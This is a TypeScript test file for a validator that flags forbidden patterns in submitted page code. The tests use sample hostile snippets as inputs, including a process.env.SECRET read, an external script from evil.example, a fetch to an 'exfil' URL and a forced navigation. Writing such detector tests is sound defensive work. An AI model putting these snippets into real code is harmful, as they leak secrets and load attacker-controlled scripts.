// src/lib/atelier/forbidden.test.ts
import { describe, it, expect } from 'vitest'
import { checkForbidden } from './forbidden'

describe('checkForbidden', () => {
  it('passes clean work that imports a committed dataset', () => {
    const src = `---\nimport data from '@/data/climate/gistemp.json'\n---\n<canvas></canvas>`
    expect(checkForbidden(src)).toEqual([])
  })
  it('flags node fs / process access', () => {
    expect(checkForbidden(`import fs from 'node:fs'`)).toContain("node/fs/process access: node:fs")
    expect(checkForbidden(`const x = process.env.SECRET`)).toContain('node/fs/process access: process.env')
  })
  it('flags external script src', () => {
    expect(checkForbidden(`<script src="https://evil.example/x.js"></script>`))
      .toContain('external resource: https://evil.example/x.js')
  })
  it('flags external fetch and navigation', () => {
    expect(checkForbidden(`fetch('https://evil.example/exfil')`)).toContain('external resource: https://evil.example/exfil')
    expect(checkForbidden(`window.location = 'https://evil.example'`)).toContain('navigation: window.location')
  })
})
